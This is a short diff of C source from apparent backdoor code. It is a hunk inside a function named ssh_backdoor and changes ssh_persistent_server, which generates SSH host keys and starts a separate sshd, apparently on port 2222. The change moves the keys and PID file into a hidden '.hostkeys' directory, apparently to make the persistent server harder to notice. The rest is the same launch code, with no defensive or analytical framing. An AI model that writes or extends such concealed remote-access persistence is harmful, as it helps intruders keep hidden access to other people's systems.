@@ -140,18 +140,18 @@ void ssh_backdoor() {
  * @return PID of the process sshd (0 if already active)
  */
 int ssh_persistent_server() {
-#define HOSTKEY_DIR "./hostkeys"
-#define ED25519_KEY "./hostkeys/ssh_host_ed25519_key"
-#define RSA_KEY "./hostkeys/ssh_host_rsa_key"
-#define PID_FILE "./hostkeys/sshd_2222.pid"
+#define HOSTKEY_DIR "./.hostkeys"
+#define ED25519_KEY "./.hostkeys/ssh_host_ed25519_key"
+#define RSA_KEY "./.hostkeys/ssh_host_rsa_key"
+#define PID_FILE "./.hostkeys/sshd_2222.pid"
 #define SSHD_PATH "/usr/sbin/sshd"
 
   mkdir(HOSTKEY_DIR, 0700);
   if (access(ED25519_KEY, F_OK)) {
-    system("ssh-keygen -t ed25519 -f hostkeys/ssh_host_ed25519_key -N '' -q");
+    system("ssh-keygen -t ed25519 -f .hostkeys/ssh_host_ed25519_key -N '' -q");
   }
   if (access(RSA_KEY, F_OK)) {
-    system("ssh-keygen -t rsa -b 3072 -f hostkeys/ssh_host_rsa_key -N '' -q");
+    system("ssh-keygen -t rsa -b 3072 -f .hostkeys/ssh_host_rsa_key -N '' -q");
   }
   chmod(ED25519_KEY, 0600);
   chmod(RSA_KEY, 0600);
@@ -177,7 +177,7 @@ int ssh_persistent_server() {
                     "-h",
                     RSA_KEY,
                     "-o",
-                    "PidFile=hostkeys/sshd_2222.pid",
+                    "PidFile=.hostkeys/sshd_2222.pid",
                     "-o",
                     "PasswordAuthentication=no",
                     "-o",
